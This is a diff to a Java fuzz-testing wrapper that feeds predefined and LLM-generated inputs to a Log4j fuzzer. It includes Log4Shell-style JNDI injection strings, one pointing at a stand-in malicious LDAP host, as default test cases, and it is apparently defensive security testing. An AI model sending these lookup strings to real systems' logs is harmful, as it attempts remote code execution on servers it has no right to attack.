@@ -13,11 +13,11 @@ import java.util.Random;
 public class Log4jFuzzerWrapper {
     private static final List<String> TEST_CASES = new ArrayList<>();
     private static final Random RANDOM = new Random();
-    
+
     static {
         // Load test cases from our generated files
         try {
-            File corpusDir = new File("llm_fuzzer/generated_tests/corpus");
+            File corpusDir = new File("../llm_fuzzer/generated_tests/corpus");
             if (corpusDir.exists() && corpusDir.isDirectory()) {
                 for (File file : corpusDir.listFiles()) {
                     if (file.isFile() && file.getName().endsWith(".txt")) {
@@ -37,27 +37,27 @@ public class Log4jFuzzerWrapper {
                 // Add some default test cases in case our corpus isn't available
                 TEST_CASES.add("${jndi:ldap://malicious.example.com/payload}");
                 TEST_CASES.add("%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n");
-                TEST_CASES.add("{"key": "value", "jndi": "${jndi:rmi://localhost:1099/jndiLookup}"}");
+                TEST_CASES.add("{\"key\": \"value\", \"jndi\": \"${jndi:rmi://localhost:1099/jndiLookup}\"}");
             }
         } catch (IOException e) {
             System.err.println("Error loading test cases: " + e.getMessage());
         }
     }
-    
+
     public static void fuzzerTestOneInput(FuzzedDataProvider data) {
         try {
             // Randomly determine if we should use a predefined test case or generated data
             boolean usePredefined = data.consumeBoolean();
-            
+
             if (usePredefined && !TEST_CASES.isEmpty()) {
                 // Use one of our predefined test cases
                 int index = data.consumeInt(0, TEST_CASES.size() - 1);
                 String testCase = TEST_CASES.get(index);
-                
+
                 // Create a new FuzzedDataProvider with our chosen test case data
                 byte[] testCaseBytes = testCase.getBytes();
                 FuzzedDataProvider wrappedData = new FuzzedDataProvider(testCaseBytes);
-                
+
                 // Call the original fuzzer with our data
                 Log4jFuzzer.fuzzerTestOneInput(wrappedData);
             } else {
@@ -73,14 +73,14 @@ public class Log4jFuzzerWrapper {
             throw e;
         }
     }
-    
+
     private static boolean isSecurityException(Exception e) {
         // Check for security-relevant exceptions
         String message = e.getMessage() != null ? e.getMessage().toLowerCase() : "";
-        return message.contains("jndi") || 
-               message.contains("remote") || 
-               message.contains("injection") || 
-               message.contains("deserialization") ||
-               e instanceof SecurityException;
+        return message.contains("jndi") ||
+                message.contains("remote") ||
+                message.contains("injection") ||
+                message.contains("deserialization") ||
+                e instanceof SecurityException;
     }
 }
